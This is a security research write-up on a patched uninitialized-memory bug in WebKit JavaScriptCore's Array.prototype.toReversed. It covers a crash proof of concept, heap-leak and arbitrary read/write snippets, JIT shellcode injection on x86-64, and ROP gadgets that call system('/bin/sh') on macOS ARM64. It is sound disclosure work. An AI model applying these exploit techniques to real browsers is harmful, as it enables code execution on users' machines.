
## Introduction


The vulnerability introduced in commit [053d9a84](https://github.com/WebKit/WebKit/commit/053d9a84ec27095cb583274daaf41ef796c80633) is a trivial uninitialized memory issue, easy to catch by simple unit tests. At the time of discovering the bug, we believed that this would be fixed very soon. However, for exploration purposes, we took it as a chance to study the current WebKit JavaScript Engine - JavaScriptCore internals, and document our journey for the sake of contributing to the security community.

Since it was fixed in a recent commit [9158c52](https://github.com/WebKit/WebKit/commit/9158c52898ef7f10c47c884c12c67de5ee47d711), we decided to share the technical details of the vulnerability and how we successfully exploited it to gain RCE in JavaScriptCore.

## The Vulnerability: Understanding Array.prototype.toReversed()

Starting from the commit  [053d9a84](https://github.com/WebKit/WebKit/commit/053d9a84ec27095cb583274daaf41ef796c80633), where a method, `Array.prototype.toReversed()`, was reimplemented in Webkit. This method, designed to provide an efficient way to return a reversed copy of an array or string without modifying the original. 


```cpp
JSC_DEFINE_HOST_FUNCTION(arrayProtoFuncToReversed, (JSGlobalObject* globalObject, CallFrame* callFrame))
{
   VM& vm = globalObject->vm();
   auto scope = DECLARE_THROW_SCOPE(vm);


   auto thisValue = callFrame->thisValue().toThis(globalObject, ECMAMode::strict());
   RETURN_IF_EXCEPTION(scope, { });
   if (UNLIKELY(thisValue.isUndefinedOrNull()))
       return throwVMTypeError(globalObject, scope, "Array.prototype.fill requires that |this| not be null or undefined"_s);
   auto* thisObject = thisValue.toObject(globalObject);
   RETURN_IF_EXCEPTION(scope, { });


   uint64_t length = toLength(globalObject, thisObject);
   RETURN_IF_EXCEPTION(scope, { });


   if (UNLIKELY(length > std::numeric_limits<uint32_t>::max())) { // [1]
       throwRangeError(globalObject, scope, "Array length must be a positive integer of safe magnitude."_s);
       return { };
   }


   if (isJSArray(thisObject)) { //[2]
       JSArray* thisArray = jsCast<JSArray*>(thisObject);
       auto fastResult = thisArray->fastToReversed(globalObject, length); //[3]
       if (fastResult)
           return JSValue::encode(fastResult);
   }
//...
}
```


When toReversed is called on a JavaScript object, it will make sure the length is safe (1) and the object itself is an array (2). If that's the case, it will be cast to an array and called fastToReversed (3).

## The Bug: Vector Length vs Public Length Mismatch

```cpp
ALWAYS_INLINE unsigned Butterfly::optimalContiguousVectorLength(Structure* structure, unsigned vectorLength)
{
   return optimalContiguousVectorLength(structure ? structure->outOfLineCapacity() : 0, vectorLength); //[1]
}
ALWAYS_INLINE unsigned Butterfly::optimalContiguousVectorLength(size_t propertyCapacity, unsigned vectorLength)
{
   if (!vectorLength)
       vectorLength = BASE_CONTIGUOUS_VECTOR_LEN_EMPTY;
   else
       vectorLength = std::max(BASE_CONTIGUOUS_VECTOR_LEN, vectorLength);//[2]
   return availableContiguousVectorLength(propertyCapacity, vectorLength);
}

```

Upon entering `fastToReversed`, in case `length` value is smaller than 3, especially equal 1, `vectorLength` will be assigned a value of 3 at [2], while the butterfly `publicLength` remains 1. 

```cpp
JSArray* JSArray::fastToReversed(JSGlobalObject* globalObject, uint64_t length)
{
   ASSERT(length <= std::numeric_limits<uint32_t>::max());


   VM& vm = globalObject->vm();


   auto type = indexingType();
   switch (type) {
   case ArrayWithInt32:
   case ArrayWithContiguous:
   case ArrayWithDouble: {
       if (length > this->butterfly()->vectorLength())
           return nullptr;
       Structure* resultStructure = globalObject->arrayStructureForIndexingTypeDuringAllocation(type);
       IndexingType indexingType = resultStructure->indexingType();
       if (UNLIKELY(hasAnyArrayStorage(indexingType)))
           return nullptr;
       ASSERT(!globalObject->isHavingABadTime());


       auto srcData = this->butterfly()->contiguous().data();


       if (hasDouble(indexingType)) {
           if (holesMustForwardToPrototype() && containsHole(this->butterfly()->contiguousDouble().data(), static_cast<uint32_t>(length)))
               return nullptr;
       } else if (holesMustForwardToPrototype() && containsHole(srcData, static_cast<uint32_t>(length)))
           return nullptr;


       auto vectorLength = Butterfly::optimalContiguousVectorLength(resultStructure, length);//[2.1]
       void* memory = vm.auxiliarySpace().allocate(
           vm,
           Butterfly::totalSize(0, 0, true, vectorLength * sizeof(EncodedJSValue)),
           nullptr, AllocationFailureMode::ReturnNull);
       if (UNLIKELY(!memory))
           return nullptr;
       auto* butterfly = Butterfly::fromBase(memory, 0, 0);
       butterfly->setVectorLength(vectorLength);
       butterfly->setPublicLength(length);


       auto resultData = butterfly->contiguous().data();
       memcpy(resultData, srcData, sizeof(JSValue) * length);//[1]


       if (hasDouble(indexingType)) {
           auto data = butterfly->contiguousDouble().data();
           std::reverse(data, data + length); // [2]
       } else
           std::reverse(resultData, resultData + length);


       return createWithButterfly(vm, nullptr, resultStructure, butterfly);
   }
//...
}
```

Additionally, after initializing the necessary butterfly’s lengths, the function goes through `memcpy` (1) and immediately performs a reverse operation (2) , leaving any leftover uninitialized if `publicLength` is smaller than `vectorLength`. 

In the JavaScriptCore IndexingHeader class, `publicLength` is public visible length (array.length), while `vectorLength` is the length of the indexed property storage ( the actual size of storage it is holding). 

### Proof of Concept


Here's a simple PoC that triggers the vulnerability:


```js
const v1 = [-1n]; // create a JSArray 
let v2;
v2 = v1.toReversed();// call arrayProtoFuncToReversed
print(describe(v2));
sleepSeconds(5); // pause execution
print(v2[2].print()); // access randomly a field of v2[2]
```

After running this PoC, the program crashes when trying to access a field in an uninitialized element. This behavior confirms that `toReversed()` misses properly initialising additional elements when `publicLength` is smaller than `vectorLength`. 

```cpp
Object: 0x7fc8ab0094c8 with butterfly 0x7fc8a90927e8(base=0x7fc8a90927e0) (Structure 0x7fc7000060f0:[0x60f0/24816, Array, (0/0, 0/0){}, ArrayWithContiguous, Unknown, Proto:0x7fc8ab008988]), StructureID: 24816

pwndbg> tele 0x7fc8a90927e0
00:0000│  0x7fc8a90927e0 ◂— 0x300000001
01:0008│  0x7fc8a90927e8 —▸ 0x7fc8ab01e608 ◂— 0x100030000005210
02:0010│  0x7fc8a90927f0 ◂— 0xbadbeef0 // uninitialized value
... ↓     5 skipped
pwndbg> c
Continuing.
Thread 1 "jsc" received signal SIGSEGV, Segmentation fault.
0x00005641527ffa82 in llint_op_get_by_id ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
*RAX  0xfffffffffffffff5
 RBX  0
*RCX  0xbadbeef0
*RDX  0x7fc8a9001390 ◂— 0
*RDI  0x7ffc350bd118 —▸ 0x7fc8a9400000 ◂— 3
*RSI  1
*R8   0xd4
*R9   0xd40000004
*R10  0x7fc8a9001770 ◂— 0x60f0
*R11  0xffffffff
*R12  0x7fc8a9001310 ◂— 0x68006800680068 /* 'h' */
*R13  0x7fc8ab070900 ◂— 0xfbf91c10fa9286
*R14  0xfffe000000000000
*R15  0xfffe000000000002
*RBP  0x7ffc350bd230 —▸ 0x7ffc350bd2a0 —▸ 0x7ffc350bdc40 —▸ 0x7ffc350bdd50 —▸ 0x7ffc350be0d0 ◂— ...
*RSP  0x7ffc350bd1a0 —▸ 0x7fc8a903a088 ◂— 0x128340000009440
*RIP  0x5641527ffa82 (llint_op_get_by_id+94) ◂— mov esi, dword ptr [rcx]
─────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5641527ffa82 <llint_op_get_by_id+94>     mov    esi, dword ptr [rcx]     <Cannot dereference [0xbadbeef0]>
   0x5641527ffa84 <llint_op_get_by_id+96>     mov    eax, dword ptr [rdx]
   0x5641527ffa86 <llint_op_get_by_id+98>     cmp    eax, esi
   0x5641527ffa88 <llint_op_get_by_id+100>    jne    llint_op_get_by_id+456      <llint_op_get_by_id+456>
 
   0x5641527ffa8e <llint_op_get_by_id+106>    movsxd rsi, dword ptr [rdx + 4]
   0x5641527ffa92 <llint_op_get_by_id+110>    cmp    esi, 0x40
   0x5641527ffa95 <llint_op_get_by_id+113>    jl     llint_op_get_by_id+126      <llint_op_get_by_id+126>
 
   0x5641527ffa97 <llint_op_get_by_id+115>    mov    rcx, qword ptr [rcx + 8]
   0x5641527ffa9b <llint_op_get_by_id+119>    neg    esi
   0x5641527ffa9d <llint_op_get_by_id+121>    movsxd rsi, esi
   0x5641527ffaa0 <llint_op_get_by_id+124>    jmp    llint_op_get_by_id+133      <llint_op_get_by_id+133>
──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc350bd1a0 —▸ 0x7fc8a903a088 ◂— 0x128340000009440
01:0008│-088 0x7ffc350bd1a8 ◂— 0xa /* '\n' */
02:0010│-080 0x7ffc350bd1b0 —▸ 0x7ffc350bd1c0 —▸ 0x7ffc350bd230 —▸ 0x7ffc350bd2a0 —▸ 0x7ffc350bdc40 ◂— ...
03:0018│-078 0x7ffc350bd1b8 —▸ 0x7fc868e48038 ◂— movabs rdx, 0x7fc8a9400018 /* 0x7fc8a9400018ba48 */
04:0020│-070 0x7ffc350bd1c0 —▸ 0x7ffc350bd230 —▸ 0x7ffc350bd2a0 —▸ 0x7ffc350bdc40 —▸ 0x7ffc350bdd50 ◂— ...
05:0028│-068 0x7ffc350bd1c8 —▸ 0x7fc8ab0094c8 ◂— 0x1082409000060f0
06:0030│-060 0x7ffc350bd1d0 —▸ 0x7fc8ab054318 ◂— 0x108350000005440 /* '@T' */
07:0038│-058 0x7ffc350bd1d8 ◂— 0xbadbeef0

```
## The Fix

The fix in commit 9158c52 simply `memset` all remaining values to 0, NaN, or Undefined, ensuring proper initialization. 

```cpp
       auto resultData = butterfly->contiguous().data();
       memcpy(resultData, srcData, sizeof(JSValue) * length);//[3.2]
       if (size_t remaining = vectorLength - length; remaining) {
           if (hasDouble(type)) {
#if OS(DARWIN)
               constexpr double pattern = PNaN;
               memset_pattern8(static_cast<void*>(butterfly->contiguous().data() + length), &pattern, sizeof(JSValue) * remaining);
#else
               for (unsigned i = length; i < vectorLength; ++i)
                   butterfly->contiguousDouble().atUnsafe(i) = PNaN;
#endif
           } else {
#if USE(JSVALUE64)
               memset(static_cast<void*>(butterfly->contiguous().data() + length), 0, sizeof(JSValue) * remaining);
#else
               for (unsigned i = length; i < vectorLength; ++i)
                   butterfly->contiguous().atUnsafe(i).clear();
#endif
           }
       }

```


## Exploitation on Linux machine (x86-64 architecture)

### Turning into read/write primitives 

The next step is to gain arbitrary read/write. In order to do that, let's again illustrate the internal array structure in JavaScriptCore. From the Frack article Attacking JavaScript Engines, Saleo describe butterfly concept in general as:
 “Internally, JSC stores both properties and elements in the same memory region and stores a pointer to that region in the object itself. This pointer points to the middle of the region, properties are stored to the left of it (lower addresses) and elements to the right of it. There is also a small header located just before the pointed to address that contains the length of the element vector. This concept is called a "Butterfly" since the values expand to the left and right, similar to the wings of a butterfly.”

### Leaking addresses 

Since JSC arrays have dynamic types, and the uninitialized memory happens in an array value, we can simply spray the heap with some object pointers, free it with gc() , then trigger the vulnerability multiple times to force the allocation to reuse the heap. Then we can read the pointer from double arrays directly thus achieving memory leak. Illustration by snippet code below:  
```js
let spray_arr = new Array(0x20);
for (let i = 0; i < 0x40; i++) {
   spray_arr[i] = [2.1*i, 2.2, 2.3]; // spray some arrays
}
gc(); // clean memory and force allocation reusing above’s heap 


b1 = [1.1];
b1 = b1.toReversed();
let addr1 = f2i(b1[1]);// b1[1] is previous heap chunk and will be leaked
print ("leak1: " + hex(addr1));

```

### Achieve Arbitrary Memory Write/Read
With a successful heap leak, we can now work towards crafting a fake object and achieving arbitrary read/write access:

Heap spraying for fake objects: We allocate a large number of pointers pointing to a predictable area inside the heap. Those pointers will be interpreted as object pointers when a `toReversed()` object array catches them.

Triggering the bug again: We create more `toReversed()` object arrays, which capture pointers we sprayed in step 1. 

Structuring a fake object: By spraying Structure ID and butterfly pointer onto the area to which captured pointers pointing, we tricked JSC to interpret the sprayed pointers as valid object pointers.


This way of creating fakeObj is obviously not stable, and requires a lot of effort. In order to make our fakeObj bring more to the table, and avoid doing it again, the butterfly pointer should preferably point to our controlled double array, which gives us the ability to control its length. Since then, we got an out-of-bound array, making the remaining part of our exploit easier.

At this point, we gain three key primitives:

  * AddrOf – Allows us to obtain the memory address of a JavaScript object.
  * arbRead – Enables arbitrary memory reads by manipulating the fake object’s properties.
  * arbWrite – Grants arbitrary memory writes by overlapping the fake object with a controlled double array.

With full read/write capabilities, we are now ready to take the final step—achieving code execution, breaking through JavaScriptCore’s security defenses.
Code execution
After getting arbitrary read/write primitive, we easily overwrite shellcode into the JIT compiled page, and obtain shell execution:


## Exploitation on macOS machine (ARM64 architecture)

With code execution successfully achieved on Linux (x86-64), our next challenge was to port the exploit to macOS (ARM64). Unlike its x86, macOS enforces stricter exploit mitigations, making direct exploitation significantly more challenging. 

### MacOS Challenges

On macOS running Apple Mx chips, several security mitigations prevent traditional exploitation techniques:

JIT Memory Protections: Unlike x86-64, JIT pages are no longer RWX (Read-Write-Execute). Instead, they are mapped as RX (Read-Execute) only, preventing attackers from injecting shellcode directly into executable memory.

Pointer Authentication (PAC): Many function pointers and return addresses are protected with PAC (Pointer Authentication Codes), making arbitrary code execution more difficult.

APRR (Authenticated Pointer Read Restriction): Certain memory regions, including JIT code pages, are protected from direct reading, which makes memory disclosure attacks less effective.

Our next step was bypassing JIT memory protections, since our previous approach of injecting shellcode into JIT pages no longer worked. And in this blog we only discuss how to overcome this mitigation, because others are more hardly touchable for us now. 
Bypassing JIT Memory Protections

On this part, we found [Ivan Krstić’s 2016 Black Hat talk ](https://www.blackhat.com/docs/us-16/materials/us-16-Krstic.pdf). His presentation provided the evolution of IOS JIT hardenings. On iOS 9, JIT pages were still RWX:
However, with iOS 10, Apple introduced stricter memory protections: 
On our understanding, this mitigation makes JIT pages dynamically switch between RW (Read-Write) and RX (Read-Execute) but are never RWX at the same time. Instead, they follow a Write XOR Execute (W^X) policy:

When JIT compiles code, the page is temporarily marked RW (Read-Write) but not executable.
Once the JIT compilation is finished, the page is switched to RX (Read-Execute) but not writable.

For example, the function `performJITMemcpy` function as the case enables writing permission on JIT page, but disable as soon as after `memcpy` function. 
```
static ALWAYS_INLINE void* performJITMemcpy(void *dst, const void *src, size_t n)
{
   //...
       if (g_jscConfig.useFastJITPermissions) {
           threadSelfRestrict<MemoryRestriction::kRwxToRw>(); // change to RW
           memcpyAtomicIfPossible(dst, src, n); // copy JIT code
           threadSelfRestrict<MemoryRestriction::kRwxToRx>(); // rechange to RX
//...
```

To achieve arbitrary code execution, we would need to either re-enable write permissions on an existing JIT page or use a ROP-based approach to call the system function (in case [CFI](https://en.wikipedia.org/wiki/Control-flow_integrity) was disabled,  but we don’t know on Safari or other macOS system application as the same or not) 
Technique: ROPing to Execute System Commands

Instead of modifying JIT code itself, we leveraged existing executable instructions within the JavaScriptCore binary to construct a ROP chain that would call system("/bin/sh").

Our approach was as follows:

Leaking JSC address base and system() function address
By arbitrary read/write, we can easily leak JSC base address and other system functions:
```
const jscBase = mathExpAddr - JSC_BASE_TO_MATH_EXP;
print("jscBase: " + hex(jscBase));


// reading system_libc
var random_addr = arb_read(jscBase + 0x16110D8n);
print("random_addr: " + hex(random_addr));
var system_addr = random_addr + SYSTEM_RANDOM_GAP;
print("system_addr: " + hex(system_addr));

```

2. Constructing the ROP Chain
Next step, we overwrite the JIT code address with a crafted ROP chain. Before directly jumping to a code address, we realized that we could control the x21 register’s memory, making it a useful target for gadget chaining.

```asm
(lldb) reg r
General Purpose Registers:
       x0 = 0x000000010306c8dc 
       x1 = 0x0000000000000000
       x2 = 0x000000016fdfe5b0
       x3 = 0x000000010d160800
       x4 = 0x000000000000160a
       x5 = 0x000000016fdfe6e0
       x6 = 0x0000000101040990
       x7 = 0x0000000000000001
       x8 = 0x0000000000000000
       x9 = 0x0000000000000020
      x10 = 0x00000000ffffffff
      x11 = 0x0000000000000148
      x12 = 0x0000000103b216aa  JavaScriptCore`JSC::arrayConstructorTableIndex + 52
      x13 = 0x0000000000000000
      x14 = 0x000000000000001b
      x15 = 0x0000000000000001
      x16 = 0x000000019318b16c  libsystem_pthread.dylib`pthread_getspecific
      x17 = 0x00000001039c42f8  JavaScriptCore`jsc_llint_begin + 161528
      x18 = 0x0000000000000000
      x19 = 0x0000000000000000
      x20 = 0x0000000103be8000  JavaScriptCore`g_config
      x21 = 0x000000010108d440 /// JSC’s heap memory 
      x22 = 0x000000010d400050
      x23 = 0x000000010d400000
      x24 = 0x000000010104c408
      x25 = 0x000000010d4401f0
      x26 = 0x000000010d0c1a00
      x27 = 0xfffe000000000000
      x28 = 0xfffe000000000002
       fp = 0x000000016fdfe730
       lr = 0x00000001039c43e4  JavaScriptCore`jsc_llint_begin + 161764
       sp = 0x000000016fdfe6e0
       pc = 0x000000010306c8dc 
      cpsr = 0xa0001000
```

We then looked for gadgets that interact with x21, and found two key instruction sequences:

First Gadget: Modifying x0, x8, and x3, then branching to x3
This gadget enables us to control x0 (first function argument), x8 (load base), and x3 (function jump target) before executing a branch instruction (br x3):
```asm
(lldb) x/10i 0x10306c8dc
->  0x10306c8dc: ldr    x0, [x21, #0x10]  // Load value from x21 into x0
   0x10306c8e0: ldr    x8, [x0]          // Load x0’s base into x8
   0x10306c8e4: ldr    x3, [x8, #0x10]   // Load x3, which will be our jump target
   0x10306c8e8: mov    x1, x20
   0x10306c8ec: mov    x2, x22
   0x10306c8f0: ldp    x29, x30, [sp, #0x30]
   0x10306c8f4: ldp    x20, x19, [sp, #0x20]
   0x10306c8f8: ldp    x22, x21, [sp, #0x10]
   0x10306c8fc: add    sp, sp, #0x40
   0x10306c900: br     x3                // Jump to x3 (controlled)
```
Second Gadget: Modifying x1 and x0, then branching to x1
This gadget allows us to set up x1 (second function argument) and x0 (first function argument) before branching to x1, effectively calling a function:
```asm
(lldb) x/10i 0x103ec014
->  0x103ec014: ldr    x1, [x8, #0x18]  // Load x1
   0x103ec018: ldr    x0, [x0, #0x58]  // Load x0
   0x103ec01c: br     x1               // Branch to x1 (controlled function call)
```
By combining these two gadgets, we can load the system() function address into x1, prepare its argument ("/bin/sh") in x0, and execute the call, effectively launching a shell.

Using this ROP-based approach, we successfully bypassed JIT memory protections and achieved code execution on macOS as the below image:


### The PAC Roadblock

  While our ROP-based approach successfully exploited JavaScriptCore on macOS (ARM64), Pointer Authentication (PAC) remains an unbroken mitigation in this case. In a fully hardened macOS environment, our exploit would likely fail due to PAC verification, it’s a big challenge waiting for us. 


## Summary

  In this blog, we explored JavaScriptCore exploitation, on x86-64 architecture and overcame one arm64 mitigation. This project was a valuable learning experience for us, laying the foundation for future Safari and JavaScriptCore research. During understanding mitigation, we found the blog [JITSploitation III](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-three.html): Subverting Control Flow, Saelo had described JIT memory protection as the small part of APRR “With the APRR register set up in this way, it would effectively enforce a strict W^X policy: no page could ever be writable and executable at the same time. So we were confused to explain both mitigations, in the end we decided to point out only JIT memory protection as we only discuss bypassing itself. If something goes wrong because lacking of our knowledge, please let us know, thank you everyone for reading our blog. 

The PoC and exploitation scripts are available on GitHub.

References  
[Note changes after 3 years of attacking JSC (Saelo)](https://gist.github.com/saelo/dd598a91a27ddd7cb9e410dc92bf37a1)  
[Diary of a reverse-engineer](https://doar-e.github.io/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/)  
[Webkit Pwn2Own 2022](https://starlabs.sg/blog/2022/09-step-by-step-walkthrough-of-cve-2022-32792/)  
[Introduce JavaScriptCore](https://www.cyberark.com/resources/threat-research-blog/the-mysterious-realm-of-javascriptcore)  
[APRR](https://blog.siguza.net/APRR/)  
[Behind the Scenes with iOS Security](https://www.blackhat.com/docs/us-16/materials/us-16-Krstic.pdf)  
[JITSploitation III: Subverting Control Flow](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-three.html)  
